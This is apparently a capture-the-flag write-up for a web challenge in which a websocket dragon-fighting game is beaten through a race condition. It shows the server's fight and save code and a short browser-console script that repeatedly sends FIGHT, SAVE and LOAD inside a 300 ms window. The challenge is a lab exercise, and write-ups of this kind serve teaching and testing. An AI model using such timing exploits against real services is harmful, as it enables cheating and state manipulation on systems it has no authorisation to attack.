# web/Be a Legend
> Try out our new game built on state of the art websocket technology. Defeat the dragon and become a legend!

## Background
Opening up the challenge, we are given a small UI in which a player is fighting a dragon. 

<body align="left">
  <img src = "BeALegendHome.jpg" width=400>
</body>

We are given the option to view our stats, fight, save, load, and reset.

<body align="left">
  <img src = "options.jpg" width=400>
</body>

When attempting to attack the dragon, we immediately lose all of our health and die. Damn.

<body align="lefT">
  <img src = "attack.jpg" width=400>
</body>

Taking a look at the source code for the attacking functionality, we are given:
```

async def fight_loop(ws, connection_id):
    state = get_game_state(connection_id)
    player = state.player
    dragon = state.dragon

    try:
        while True:
            await asyncio.sleep(0.3)
            # Exit game conditions
            if state.is_dead or state.is_win:
                # I doubt the player will win, lets just reuse this frontend signal instead.
                ws.send("You have died. Game Over.")
                ws.send("PLAYER_DIED")  # Signal to frontend
                break

            damage = min(player.stats.atk, 50)
            dragon.stats.hp -= damage
            ws.send(f"You hit the dragon for {damage} damage. Dragon HP: {dragon.stats.hp:,}")

            await asyncio.sleep(0.3) # Cool turn based combat

            player.stats.hp -= dragon.stats.atk
            ws.send(f"The dragon hits you for {dragon.stats.atk:,} damage. Your HP: {player.stats.hp}")

            # Check and set our exit conditions
            if player.stats.hp <= 0:
                state.is_dead = True
            
            # Wincon
            if dragon.stats.hp <= 0:
                state.is_win = True
                ws.send(
                    "The dragon collapses in defeat!\n\n"
                    "FLAG: bkctf{test_flag}\n\n"
                    "Congratulations, brave warrior!"
                )

    except Exception as e:
        ws.send(f"Combat error: {str(e)}")

async def save_game(connection_id):
    state = get_game_state(connection_id)
    state.last_save = pickle.dumps(state)
```
The logic follows this order:
1. The game fetchs the player's stats and checks if its dead or not.

2.The player hits the dragon for 10 damage.

3. The server waits 0.3 seconds.

4. The dragon hits the player for 999 damage.

5. Check if the player's health is less than 0.

6. Check if the dragon's health is less than 0. If so, return the flag.

## Finding the vuln
At first, I took a look at the client-side code, there are a few functions that i was interested in at first.
The client-side JS allows us to define stats for the user and the drag.
```
function updatePlayerAtk(atk) {
    playerAtk.textContent = atk;
}
```
However, these were ultimately useless because the server ended up hard-coding it.

Thus, the bug had to exist somewhere server-side. 

Reading the attack logic of the code, the 300ms of downtime between us attacking the dragon and the dragon attacking us looks really weird. I didn't actually see this first, I played around with the client-side game to find this out. But after the player attacks the dragon and then immediately saves within the next 300 ms, the dragon's health would decrease by 10 whilst the user would remain at full health. Essentially saving right before we die.

<body align="left"> 
  <img src = "vuln.jpg" width=400>
</body>

All thats left to do is somehow automate this process. 

Taking a look at the network logs after sending a request, it looks like all attacks are sent from the clientside directly to the server. Thus we would have to frame our solve in the client-side console.
<body align="lefT">
  <img src = "network.jpg" width=400>
</body>

Taking a look at the client-side source, we have some functions that send our attacks directly to the server. Namely the sendCommand() function.
```
function sendCommand(cmd) {
    if (!ws || ws.readyState !== WebSocket.OPEN) {
        addOutput('Not connected to server!', 'error');
        return;
    }
    
    const command = cmd || commandInput.value.trim();
    
    if (!command) return;
    
    // Add to history
    if (cmd === undefined) { // Only add to history if typed manually
        commandHistory.unshift(command);
        if (commandHistory.length > 50) {
            commandHistory.pop();
        }
        historyIndex = -1;
    }
    
    // Display command
    addOutput(`warrior@dragon:~$ ${command}`, 'info');
    
    // Send to server
    ws.send(command);
    
    // Clear input
    commandInput.value = '';
}
```
# Solve
Essentially our solve would have to look something like this.

1. Send the command "FIGHT" to the server.
2. Within the 300 ms window between when we attack the dragon and the dragon attacks us, save the game
3. Load the game
4. Repeat.
```
let running = 100;

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function cycle() {
  while (running > 0) {
    sendCommand("FIGHT");
    await delay(300);
    
    sendCommand("SAVE");
    await delay(600);

    

    running = running - 1;
    await delay(200);
    sendCommand("LOAD");
  }
}


cycle();
```
After running the script, we get the flag. Also I ran this locally because the infrastructure is down at the time of writing this.
<body align="lefT">
  <img src = "flag.jpg" width=400>
</body>
